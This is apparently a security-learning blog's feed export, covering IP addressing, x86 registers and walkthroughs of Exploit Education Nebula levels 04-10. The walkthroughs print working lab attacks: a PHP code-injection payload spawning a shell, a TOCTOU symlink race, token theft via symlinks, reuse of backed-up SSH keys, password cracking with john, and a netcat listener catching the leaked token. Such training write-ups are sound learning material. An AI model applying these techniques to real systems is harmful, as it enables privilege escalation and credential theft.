&lt;li&gt;Class C: uses 255.255.255.0 (CIDR /24) and have &lt;code&gt;192-223&lt;/code&gt; as first octet.&lt;/li&gt;
&lt;li&gt;Class D: range &lt;code&gt;224-239&lt;/code&gt; as first octet, used for multicasting&lt;/li&gt;
&lt;li&gt;Class E: range &lt;code&gt;240-255&lt;/code&gt; as first octet, not available for general use, reserved for research purposes.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;CIDR&lt;/h3&gt;
&lt;p&gt;Subnet with all zeros is reserved for the referring to the network itself, while last address, all ones is used as broadcast address for the network. It means, that from network, two addresses are unavailable. In the world of CIDR, &lt;code&gt;/31&lt;/code&gt; and &lt;code&gt;/32&lt;/code&gt;, would be unusable, due to above requirement. That's why &lt;code&gt;RFC3021&lt;/code&gt; created an exception. Network &lt;code&gt;/31&lt;/code&gt; is usable for point-to-point links, while &lt;code&gt;/32&lt;/code&gt; (single-host network) must be accessed by explicit routing rules, as there is no room in such a network for a gateway.&lt;/p&gt;
&lt;h3&gt;IPv6&lt;/h3&gt;
&lt;p&gt;RFC3513 (obsolete now) and RFC4291 describes IPv6 addressing architecture. This version allows to address 2^128 devices (approximately 3.4*10^38). It's been introduced in December 1995, but still majority of Internet relies on IPv4.
IPv6 is divided into two parts (each 64 bits): network identifier and interface identifier. Furthermore, the first 64 bits ends with a dedicated 16-bits space that can be used only for specifying a subnet.&lt;/p&gt;
&lt;h1&gt;Additional resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/IPv4_packet#Header"&gt;IPv4 protocol header&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/network/windows-network-architecture-and-the-osi-model"&gt;Network architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/OSI_model"&gt;OSI model&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc5735"&gt;RFC5735&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://support.microsoft.com/en-us/help/164015/understanding-tcp-ip-addressing-and-subnetting-basics"&gt;subnet masks&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc1878"&gt;RFC1878 - Variable Length Subnet Table For IPv4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing#IPv4_CIDR_blocks"&gt;CIDR - Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc3021"&gt;RFC3021 - Using 31-bit Prefixes on IPv4 Point-to_-Point links&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc4291"&gt;RFC4291 - Internet Protocol Version 6 (IPv6) Addressing Architecture&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="learning"></category><category term="pts"></category><category term="network"></category></entry><entry><title>General Purpose Registers</title><link href="https://blog.smigiel.dev/general-purpose-registers.html" rel="alternate"></link><published>2020-09-16T00:00:00-07:00</published><updated>2020-09-16T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-16:/general-purpose-registers.html</id><summary type="html">&lt;h1&gt;Basics&lt;/h1&gt;
&lt;p&gt;There are 8 generic purpose registers:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Naming convention&lt;/th&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Purpose&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;EAX&lt;/td&gt;
&lt;td&gt;Accumulator&lt;/td&gt;
&lt;td&gt;Used in arithmetic operations&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EBX&lt;/td&gt;
&lt;td&gt;Base Pointer&lt;/td&gt;
&lt;td&gt;Used as a pointer to data&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ECX&lt;/td&gt;
&lt;td&gt;Counter&lt;/td&gt;
&lt;td&gt;Used in shift/rotate instructions and loops&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EDX&lt;/td&gt;
&lt;td&gt;Data&lt;/td&gt;
&lt;td&gt;Used in arithmetic operations and I/O&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ESP&lt;/td&gt;
&lt;td&gt;Stack Pointer&lt;/td&gt;
&lt;td&gt;Pointer to the â€¦&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</summary><content type="html">&lt;h1&gt;Basics&lt;/h1&gt;
&lt;p&gt;There are 8 generic purpose registers:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Naming convention&lt;/th&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Purpose&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;EAX&lt;/td&gt;
&lt;td&gt;Accumulator&lt;/td&gt;
&lt;td&gt;Used in arithmetic operations&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EBX&lt;/td&gt;
&lt;td&gt;Base Pointer&lt;/td&gt;
&lt;td&gt;Used as a pointer to data&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ECX&lt;/td&gt;
&lt;td&gt;Counter&lt;/td&gt;
&lt;td&gt;Used in shift/rotate instructions and loops&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EDX&lt;/td&gt;
&lt;td&gt;Data&lt;/td&gt;
&lt;td&gt;Used in arithmetic operations and I/O&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ESP&lt;/td&gt;
&lt;td&gt;Stack Pointer&lt;/td&gt;
&lt;td&gt;Pointer to the top of the stack&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EBP&lt;/td&gt;
&lt;td&gt;Base Pointer (Stack Base Pointer, Frame Pointer )&lt;/td&gt;
&lt;td&gt;Pointer to the base of the stack&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ESI&lt;/td&gt;
&lt;td&gt;Source Index&lt;/td&gt;
&lt;td&gt;Used as a pointer to a source in stream operation&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EDI&lt;/td&gt;
&lt;td&gt;Destination&lt;/td&gt;
&lt;td&gt;Used as a pointer to a destination in stream operation&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Additionally, exists &lt;em&gt;EIP&lt;/em&gt; (Instruction Pointer) which controls the program execution. It contains the address of the &lt;strong&gt;next&lt;/strong&gt; instruction to be exetucted (it tells the CPU where the next instruction is).&lt;/p&gt;
&lt;h1&gt;Program Memory&lt;/h1&gt;
&lt;p&gt;Running process is usually organized in 2 sections: read-only and read/write.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.text - address space where program's executable instructions is stored.&lt;/li&gt;
&lt;li&gt;.data - global and static variables which have pre-defined value and can be modified.&lt;/li&gt;
&lt;li&gt;BSS (Block Started by Symbol) - uninitialized data, is usually adjacent to .data segment. Contains all global and static variables which are initialized to zero or do not have specific explicit initialization in source code.&lt;/li&gt;
&lt;li&gt;Heap - area commonly begins at the end of BSS and .data segments. and grows to larger addresses from there. This area is managed by &lt;em&gt;malloc&lt;/em&gt;, &lt;em&gt;realloc&lt;/em&gt; and &lt;em&gt;free&lt;/em&gt;. This area is shared by all threads, shared libraries, and dynamically loaded modules in a process.&lt;/li&gt;
&lt;li&gt;Stack - typically located in the higher parts of memory. ESP tracks the top of the stack.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Heap grows towards higher memory addresses. Stack grows towards lower memory addresses.&lt;/p&gt;
&lt;p&gt;Lower address | .text | .data | BSS | Heap -&amp;gt; ... &amp;lt;- Stack | Higher address&lt;/p&gt;
&lt;h2&gt;Stack&lt;/h2&gt;
&lt;p&gt;The Stack is Last-in First-out (&lt;strong&gt;LIFO&lt;/strong&gt;). It is array for saving addresses, passing function arguments, and storing local variables.
There are two operations &lt;em&gt;PUSH/POP&lt;/em&gt; to work with stack. With each operation, &lt;em&gt;ESP&lt;/em&gt; is updated. Because stack grows towards lower addresses of memory, when we &lt;em&gt;PUSH&lt;/em&gt; something on stack, stack pointer is reduced &lt;code&gt;ESP-4&lt;/code&gt; (-4 for 32 bits, -8 for 64 bits). When we remove something from stack by &lt;em&gt;POP&lt;/em&gt;ing it, ESP changes address again &lt;code&gt;ESP+4&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;PUSH&lt;/em&gt;ed data is written to the stack memory, and later ESP address is updated &lt;code&gt;ESP-4&lt;/code&gt;.
&lt;em&gt;POP&lt;/em&gt;ped data is read from the stack and written to given register &lt;code&gt;POP EAX&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Values &lt;em&gt;POP&lt;/em&gt;ed from stack are not deleted/removed. They stay in stack until another instruction overwrites it.&lt;/p&gt;
&lt;h2&gt;Additional resources:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#General-Purpose_Registers_(GPR)_-_16-bit_naming_conventions"&gt;GPR naming - WikiBooks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Data_segment"&gt;Data segment - Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Call_stack"&gt;Call stack - Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="learning"></category><category term="fundamentals"></category><category term="ptp"></category></entry><entry><title>Exploit Education - Nebula Part 3</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-3.html" rel="alternate"></link><published>2020-09-07T00:00:00-07:00</published><updated>2020-09-08T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-07:/exploit-education-nebula-part-3.html</id><summary type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-08/"&gt;Level 08&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;This sounds easy enough. Just go to &lt;code&gt;flag08&lt;/code&gt; directory and see what kind of files are there.
At first, I felt intimidated by &lt;code&gt;root:root&lt;/code&gt; access to &lt;code&gt;capture.pcap&lt;/code&gt; file. However, it occured that the file allows to be read by anyone. In that case, we might â€¦&lt;/p&gt;</summary><content type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-08/"&gt;Level 08&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;This sounds easy enough. Just go to &lt;code&gt;flag08&lt;/code&gt; directory and see what kind of files are there.
At first, I felt intimidated by &lt;code&gt;root:root&lt;/code&gt; access to &lt;code&gt;capture.pcap&lt;/code&gt; file. However, it occured that the file allows to be read by anyone. In that case, we might be able to copy it and retrieve necessary information.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;p&gt;After downloading &lt;code&gt;capture.pcap&lt;/code&gt; I was able to open it with &lt;code&gt;wireshark&lt;/code&gt;, where I've seen some tcp traffic. By selecting &lt;code&gt;Follow TCP&lt;/code&gt; I've noticed that this is dump of someone's login attempts.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;..wwwbugs login: l.le.ev.ve.el.l8.8&lt;/span&gt;
&lt;span class="cp"&gt;..&lt;/span&gt;
Password: backdoor...00Rm8.ate
.
&lt;span class="cp"&gt;..&lt;/span&gt;
Login incorrect
wwwbugs login:
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, hex dump shows some more details&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;000000B9  62                                                 b&lt;/span&gt;
&lt;span class="err"&gt;000000BA  61                                                 a&lt;/span&gt;
&lt;span class="err"&gt;000000BB  63                                                 c&lt;/span&gt;
&lt;span class="err"&gt;000000BC  6b                                                 k&lt;/span&gt;
&lt;span class="err"&gt;000000BD  64                                                 d&lt;/span&gt;
&lt;span class="err"&gt;000000BE  6f                                                 o&lt;/span&gt;
&lt;span class="err"&gt;000000BF  6f                                                 o&lt;/span&gt;
&lt;span class="err"&gt;000000C0  72                                                 r&lt;/span&gt;
&lt;span class="err"&gt;000000C1  7f                                                 .&lt;/span&gt;
&lt;span class="err"&gt;000000C2  7f                                                 .&lt;/span&gt;
&lt;span class="err"&gt;000000C3  7f                                                 .&lt;/span&gt;
&lt;span class="err"&gt;000000C4  30                                                 0&lt;/span&gt;
&lt;span class="err"&gt;000000C5  30                                                 0&lt;/span&gt;
&lt;span class="err"&gt;000000C6  52                                                 R&lt;/span&gt;
&lt;span class="err"&gt;000000C7  6d                                                 m&lt;/span&gt;
&lt;span class="err"&gt;000000C8  38                                                 8&lt;/span&gt;
&lt;span class="err"&gt;000000C9  7f                                                 .&lt;/span&gt;
&lt;span class="err"&gt;000000CA  61                                                 a&lt;/span&gt;
&lt;span class="err"&gt;000000CB  74                                                 t&lt;/span&gt;
&lt;span class="err"&gt;000000CC  65                                                 e&lt;/span&gt;
&lt;span class="err"&gt;000000CD  0d                                                 .&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;One can notice, that &lt;code&gt;x7f&lt;/code&gt; equals to &lt;code&gt;backspace&lt;/code&gt;. It probably means, that user pressed wrong key, and removed it.
After decyphering it, it seems to be &lt;code&gt;backd00Rmate&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;âžœ  ~ ssh flag08@nebula&lt;/span&gt;
&lt;span class="err"&gt;flag08@nebula:~$ ls&lt;/span&gt;
&lt;span class="err"&gt;capture.pcap&lt;/span&gt;
&lt;span class="err"&gt;flag08@nebula:~$ getflag&lt;/span&gt;
&lt;span class="err"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;span class="err"&gt;flag08@nebula:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-09/"&gt;Level 09&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;I couldn't crack this one, so I searched for solution over the internet. This one is explaining it very good: &lt;a href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09/"&gt;Lucian Nitescu&lt;/a&gt;. Unfortunately, my php knowledge is not the best.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;We need to use both &lt;code&gt;$filename&lt;/code&gt; and &lt;code&gt;$use_me&lt;/code&gt; variables. First one needs to contain payload, second will contain program name.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level09@nebula:~$ cat exploit.php
&lt;span class="o"&gt;[&lt;/span&gt;email &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(sh)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="o"&gt;}]&lt;/span&gt;
level09@nebula:~$ ~flag09/flag09 exploit.php .
PHP Notice:  Use of undefined constant sh - assumed &lt;span class="s1"&gt;&amp;#39;sh&amp;#39;&lt;/span&gt; in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;
sh-4.2$ whoami
flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Interesting that, when I replaced &lt;code&gt;sh&lt;/code&gt; with &lt;code&gt;bash&lt;/code&gt; it is not working:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;PHP Notice:  Use of undefined constant bash - assumed &lt;span class="s1"&gt;&amp;#39;bash&amp;#39;&lt;/span&gt; in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;
bash-4.2$ whoami
level09
bash-4.2$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;One can always provide &lt;code&gt;$use_me&lt;/code&gt; variable too.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level09@nebula:~$ cat exploit.php
&lt;span class="o"&gt;[&lt;/span&gt;email &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$use_me&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="o"&gt;}]&lt;/span&gt;
level09@nebula:~$ ~flag09/flag09 exploit.php getflag
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;

level09@nebula:~$ ~flag09/flag09 exploit.php sh
sh-4.2$ whoami
flag09
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-10/"&gt;Level 10&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;TOCTOU == Time of Check, Time of Use&lt;/p&gt;
&lt;p&gt;This is another one, where I spent significant amount of time. Even if I know how it suppose to work, I haven't been able to implement the solution correctly.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Time of Check, Time of Use means, that when program is running, it needs to verify an access to file, where we have an access. However, after doing that, we need to swap this file, with another one, which is unavailable to us.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;p&gt;Nebula instance:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level10@nebula:~$ touch my_file
level10@nebula:~$ &lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; ln -sf /home/flag10/token token&lt;span class="p"&gt;;&lt;/span&gt; ln -sf my_file token&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;4467&lt;/span&gt;
level10@nebula:~$ &lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; /home/flag10/flag10 token debian&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
You don&lt;span class="s1"&gt;&amp;#39;t have access to token&lt;/span&gt;
&lt;span class="s1"&gt;You don&amp;#39;&lt;/span&gt;t have access to token
Connecting to debian:18211 .. Connected!
Sending file .. wrote file!
Connecting to debian:18211 .. Unable to connect to host debian
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Second instance&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dasm@debian:~$ nc -klp &lt;span class="m"&gt;18211&lt;/span&gt; &amp;gt; received
dasm@debian:~$ cat received
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nebula instance&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level10@nebula:~$ su flag10
Password:  &lt;span class="c1"&gt;# use found token&lt;/span&gt;
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;</content><category term="misc"></category><category term="learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Exploit Education - Nebula Part 2</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-2.html" rel="alternate"></link><published>2020-09-06T00:00:00-07:00</published><updated>2020-09-06T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-06:/exploit-education-nebula-part-2.html</id><summary type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-04/"&gt;Level 04&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Source code shows, that verification happens only for &lt;code&gt;token&lt;/code&gt; name. Let's create symbolic link to file and try to read its content. After reading it, let's use it as password.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level04@nebula:/home/flag04$ ls -la
total &lt;span class="m"&gt;13&lt;/span&gt;
drwxr-x--- &lt;span class="m"&gt;2&lt;/span&gt; flag04 level04   &lt;span class="m"&gt;93&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21 â€¦&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-04/"&gt;Level 04&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Source code shows, that verification happens only for &lt;code&gt;token&lt;/code&gt; name. Let's create symbolic link to file and try to read its content. After reading it, let's use it as password.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level04@nebula:/home/flag04$ ls -la
total &lt;span class="m"&gt;13&lt;/span&gt;
drwxr-x--- &lt;span class="m"&gt;2&lt;/span&gt; flag04 level04   &lt;span class="m"&gt;93&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21&lt;/span&gt;:52 .
drwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root   root     &lt;span class="m"&gt;160&lt;/span&gt; &lt;span class="m"&gt;2012&lt;/span&gt;-08-27 &lt;span class="m"&gt;07&lt;/span&gt;:18 ..
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag04 flag04   &lt;span class="m"&gt;220&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .bash_logout
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag04 flag04  &lt;span class="m"&gt;3353&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .bashrc
-rwsr-x--- &lt;span class="m"&gt;1&lt;/span&gt; flag04 level04 &lt;span class="m"&gt;7428&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21&lt;/span&gt;:52 flag04
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag04 flag04   &lt;span class="m"&gt;675&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .profile
-rw------- &lt;span class="m"&gt;1&lt;/span&gt; flag04 flag04    &lt;span class="m"&gt;37&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21&lt;/span&gt;:52 token
level04@nebula:/home/flag04$ ./flag04 token
You may not access &lt;span class="s1"&gt;&amp;#39;token&amp;#39;&lt;/span&gt;
level04@nebula:/home/flag04$ ln -s ~flag04/token /tmp/not
level04@nebula:/home/flag04$ ./flag04 /tmp/not
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:~$ su flag04
Password:  &lt;span class="c1"&gt;# use token here&lt;/span&gt;
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-05/"&gt;Level 05&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;We're looking for weak permissions. It seems that &lt;code&gt;.backup&lt;/code&gt; directory contains copy of ssh keys, which can be used.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level05@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag05
level05@nebula:/home/flag05$ ls -ahtl
total &lt;span class="m"&gt;9&lt;/span&gt;.0K
drwxr-x--- &lt;span class="m"&gt;1&lt;/span&gt; flag05 level05   &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-09-05 &lt;span class="m"&gt;19&lt;/span&gt;:18 .
-rw------- &lt;span class="m"&gt;1&lt;/span&gt; flag05 flag05    &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-09-05 &lt;span class="m"&gt;19&lt;/span&gt;:18 .bash_history
drwx------ &lt;span class="m"&gt;2&lt;/span&gt; flag05 flag05    &lt;span class="m"&gt;60&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-09-05 &lt;span class="m"&gt;19&lt;/span&gt;:17 .cache
drwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root   root     &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="m"&gt;2012&lt;/span&gt;-08-27 &lt;span class="m"&gt;07&lt;/span&gt;:18 ..
drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; flag05 flag05    &lt;span class="m"&gt;42&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;20&lt;/span&gt;:13 .backup
drwx------ &lt;span class="m"&gt;2&lt;/span&gt; flag05 flag05    &lt;span class="m"&gt;70&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;20&lt;/span&gt;:13 .ssh
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag05 flag05   &lt;span class="m"&gt;220&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .bash_logout
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag05 flag05  &lt;span class="m"&gt;3&lt;/span&gt;.3K &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .bashrc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag05 flag05   &lt;span class="m"&gt;675&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .profile
level05@nebula:/home/flag05$ &lt;span class="nb"&gt;cd&lt;/span&gt;
level05@nebula:~$ ls ~flag05/.backup
backup-19072011.tgz
level05@nebula:~$ cp ~flag05/.backup/backup-19072011.tgz .
level05@nebula:~$ tar -xvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ssh flag05@localhost
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-06/"&gt;Level 06&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;flag06&lt;/code&gt; came from a legacy unix system. It probably means, that password could be stored inside &lt;code&gt;/etc/passwd&lt;/code&gt;. After retrieving password, I had to search for an answer, how to crack it. &lt;code&gt;john&lt;/code&gt; helped with that.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level06@nebula:~$ grep flag06 /etc/passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
âžœ  ~ john --show pass
?:hello

&lt;span class="m"&gt;1&lt;/span&gt; password &lt;span class="nb"&gt;hash&lt;/span&gt; cracked, &lt;span class="m"&gt;0&lt;/span&gt; left
level06@nebula:~$ su flag06
Password:  &lt;span class="c1"&gt;# use found password&lt;/span&gt;
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


